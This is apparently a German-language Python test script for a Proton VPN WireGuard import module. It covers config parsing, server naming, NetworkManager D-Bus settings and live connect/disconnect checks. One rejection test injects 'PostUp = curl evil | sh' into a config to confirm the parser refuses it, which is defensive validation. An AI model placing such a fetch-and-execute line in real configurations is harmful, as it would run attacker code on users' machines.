"""Proton VPN (WireGuard über NetworkManager) prüfen.

   python3 tools/vpn-test.py einheit   – .conf lesen, Namen, D-Bus-Werte (ohne NetworkManager)
   sudo python3 tools/vpn-test.py nm   – echt: Verbindung über D-Bus anlegen, prüfen, verbinden, löschen
"""
import base64
import ipaddress
import os
import subprocess
import sys
import tempfile
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "shell"))
from creative_shell import vpn  # noqa: E402


def key():
    return base64.b64encode(os.urandom(32)).decode()


PRIV, PUB = key(), key()
PROTON = f"""[Interface]
# Key for Creative OS
# Bouncing = 3
# NetShield = 1
# Moderate NAT = off
# NAT-PMP (Port Forwarding) = off
# VPN Accelerator = on
PrivateKey = {PRIV}
Address = 10.2.0.2/32, 2a07:b944::2:2/128
DNS = 10.2.0.1, 2a07:b944::2:1

[Peer]
# NL-FREE#12
PublicKey = {PUB}
AllowedIPs = 0.0.0.0/0, ::/0
Endpoint = 185.107.56.1:51820
"""


def einheit():
    p = vpn.parse_conf(PROTON)
    assert p["private_key"] == PRIV
    assert p["addresses"] == [("10.2.0.2", 32, 4), ("2a07:b944::2:2", 128, 6)], p["addresses"]
    assert [str(d) for d in p["dns"]] == ["10.2.0.1", "2a07:b944::2:1"]
    assert p["peers"] == [{"public_key": PUB, "endpoint": "185.107.56.1:51820",
                           "allowed_ips": ["0.0.0.0/0", "::/0"]}], p["peers"]
    # Namen aus Dateiname oder Kommentar
    for name, text, want in (
        ("wg-DE-FREE-12.conf", "", ("DE", "Deutschland", "DE-FREE#12")),
        ("Creative-OS-NL-FREE-3.conf", "", ("NL", "Niederlande", "NL-FREE#3")),
        ("US-NY#45.conf", "", ("US", "USA", "US-NY#45")),
        ("JP-FREE-7.conf", "", ("JP", "Japan", "JP-FREE#7")),
        ("ch-de-1.conf", "", ("CH", "Schweiz", "CH-DE#1")),
        ("proton.conf", PROTON, ("NL", "Niederlande", "NL-FREE#12")),
        ("meins.conf", "", ("", "", "meins")),
    ):
        got = vpn.server_label(name, text)
        assert got == want, (name, got)
    name = vpn.connection_name("wg-DE-FREE-12.conf", "")
    assert name == "Proton VPN · Deutschland (DE-FREE#12)", name
    assert vpn.split_name(name) == ("Deutschland", "DE-FREE#12")
    # Fehler auf Deutsch, nichts Gefährliches
    bad = {
        "": "PrivateKey",
        PROTON.replace(PRIV, "abc"): "PrivateKey",
        PROTON.replace("Address = 10.2.0.2/32, ", "Address = "): "IPv4",
        PROTON.replace("Endpoint = 185.107.56.1:51820", ""): "Endpoint",
        PROTON.replace("DNS = 10.2.0.1", "PostUp = curl evil | sh\nDNS = 10.2.0.1"): "Sicherheitsgründen",
        PROTON.replace("[Peer]", "[Hallo]"): "Abschnitt",
        "x" * (vpn.MAX_CONF + 1): "zu groß",
    }
    for text, word in bad.items():
        try:
            vpn.parse_conf(text)
        except ValueError as exc:
            assert word in str(exc), (word, str(exc))
        else:
            raise AssertionError(f"nicht abgelehnt: {word}")
    s = vpn.nm_settings(p, name, "kathrin", "1b4e28ba-2fa1-11d2-883f-0016d3cca427")
    assert s["connection"] == {
        "id": name, "uuid": "1b4e28ba-2fa1-11d2-883f-0016d3cca427", "type": "wireguard",
        "interface-name": "proton0", "autoconnect": False, "permissions": ["user:kathrin:"]}
    assert s["ipv4"] == {"method": "manual", "address-data": [{"address": "10.2.0.2", "prefix": 32}],
                         "dns": ["10.2.0.1"], "dns-search": ["~."], "dns-priority": -50}, s["ipv4"]
    assert s["ipv6"]["method"] == "manual" and s["ipv6"]["dns"] == ["2a07:b944::2:1"]
    only4 = vpn.nm_settings(vpn.parse_conf(PROTON.replace(", 2a07:b944::2:2/128", "")), name, "kathrin")
    assert only4["ipv6"] == {"method": "disabled"}
    # nmcli-Liste: nur Proton-WireGuard, Doppelpunkte im Namen maskiert
    rows = vpn.parse_list("Zuhause:aaa:802-11-wireless:yes\n"
                          "Proton VPN · Japan (JP-FREE#7):u2:wireguard:no\n"
                          "Proton VPN · Niederlande (NL-FREE#12):u1:wireguard:yes\n"
                          "wg-fremd:u3:wireguard:no\n")
    assert [(r["country"], r["active"]) for r in rows] == [("Japan", False), ("Niederlande", True)], rows
    try:
        import dbus  # noqa: F401
    except ImportError:
        print("(python3-dbus fehlt – D-Bus-Typen nicht geprüft)")
    else:
        d = vpn.to_dbus(s)
        assert d.signature == "sa{sv}"
        assert d["ipv4"]["dns"].signature == "u" and int(d["ipv4"]["dns"][0]) == int.from_bytes(
            ipaddress.ip_address("10.2.0.1").packed, sys.byteorder)
        assert d["ipv6"]["dns"].signature == "ay" and bytes(d["ipv6"]["dns"][0]) == ipaddress.ip_address("2a07:b944::2:1").packed
        assert d["wireguard"]["peers"].signature == "a{sv}"
    print("VPN (ohne NetworkManager): alles in Ordnung")


def nmcli(*args, check=True):
    r = subprocess.run(["nmcli", *args], capture_output=True, text=True)
    if check and r.returncode:
        raise AssertionError(f"nmcli {' '.join(args)}: {r.stderr.strip()}")
    return r.stdout


def nm():
    """Echter NetworkManager (im Test als root, deshalb permissions user:root)."""
    from PySide6.QtCore import QCoreApplication, QEventLoop, QTimer
    app = QCoreApplication(sys.argv)  # noqa: F841

    def wait(ms):
        loop = QEventLoop()
        QTimer.singleShot(ms, loop.quit)
        loop.exec()

    folder = Path(tempfile.mkdtemp())
    full = folder / "wg-NL-FREE-12.conf"
    full.write_text(PROTON)
    # Zum Verbinden im Test nur ein kleines Netz und kein DNS – sonst wäre der Testrechner offline.
    split = folder / "wg-JP-FREE-7.conf"
    split.write_text(PROTON.replace("AllowedIPs = 0.0.0.0/0, ::/0", "AllowedIPs = 10.99.0.0/24")
                     .replace("DNS = 10.2.0.1, 2a07:b944::2:1\n", ""))
    model = vpn.VpnModel(watch=False)
    wait(1500)
    model.importFile(full.as_uri())
    assert "hinzugefügt" in model.message, model.message
    model.importFile(str(split))
    assert "hinzugefügt" in model.message, model.message
    wait(1500)
    names = [s["country"] for s in model.servers]
    assert names == ["Japan", "Niederlande"], model.servers
    nl = next(s for s in model.servers if s["country"] == "Niederlande")
    jp = next(s for s in model.servers if s["country"] == "Japan")
    show = nmcli("-g", "connection.autoconnect,connection.permissions,connection.interface-name,"
                 "ipv4.addresses,ipv4.dns,ipv4.dns-search,ipv4.dns-priority,ipv6.addresses",
                 "connection", "show", "uuid", nl["uuid"])
    print(show)
    lines = show.replace("\\:", ":").splitlines()
    assert lines[0] == "no" and lines[1] == "user:root" and lines[2] == "proton0", lines
    assert lines[3] == "10.2.0.2/32" and lines[4] == "10.2.0.1" and lines[5] == "~." and lines[6] == "-50", lines
    assert "2a07:b944::2:2/128" in lines[7], lines
    peers = nmcli("-s", "-g", "wireguard.peers", "connection", "show", "uuid", nl["uuid"], check=False).replace("\\:", ":")
    print("Peers:", peers.strip() or "(ältere nmcli zeigt keine Peers)")
    if peers.strip():
        assert PUB in peers and "185.107.56.1" in peers, peers
    secret = nmcli("-s", "-g", "wireguard.private-key", "connection", "show", "uuid", nl["uuid"])
    assert secret.strip() == PRIV, "privater Schlüssel nicht angekommen"
    assert model.lastUuid == nl["uuid"], "erster Server wird nicht vorgemerkt"
    # Verbinden (kleines Netz), Schnittstelle prüfen, trennen
    model.connectTo(jp["uuid"])
    for _ in range(30):
        wait(500)
        model.refresh()
        wait(300)
        if model.connected:
            break
    assert model.connected and model.activeCountry == "Japan", (model.message, model.servers)
    addr = subprocess.run(["ip", "-brief", "address", "show", "proton0"], capture_output=True, text=True).stdout
    print(addr.strip())
    assert "10.2.0.2/32" in addr, addr
    # Wechsel auf den vollen Tunnel (läuft im Test in einem eigenen Container-Netz)
    if os.environ.get("VPN_VOLL"):
        model.connectTo(nl["uuid"])
        for _ in range(30):
            wait(500)
            model.refresh()
            wait(300)
            if model.activeCountry == "Niederlande":
                break
        assert model.activeCountry == "Niederlande", (model.message, model.servers)
        assert sum(s["active"] for s in model.servers) == 1, model.servers
        addr = subprocess.run(["ip", "address", "show", "proton0"], capture_output=True, text=True).stdout
        print(addr.strip())
        assert "10.2.0.2/32" in addr and "2a07:b944::2:2/128" in addr, addr
        rules = subprocess.run(["ip", "rule"], capture_output=True, text=True).stdout
        print(rules.strip())
    model.disconnect()
    for _ in range(20):
        wait(500)
        model.refresh()
        wait(300)
        if not model.connected:
            break
    assert not model.connected, model.servers
    for server in list(model.servers):
        model.remove(server["uuid"])
    wait(2500)
    assert model.servers == [], model.servers
    print("VPN mit echtem NetworkManager: alles in Ordnung")


if __name__ == "__main__":
    {"einheit": einheit, "nm": nm}[sys.argv[1] if len(sys.argv) > 1 else "einheit"]()
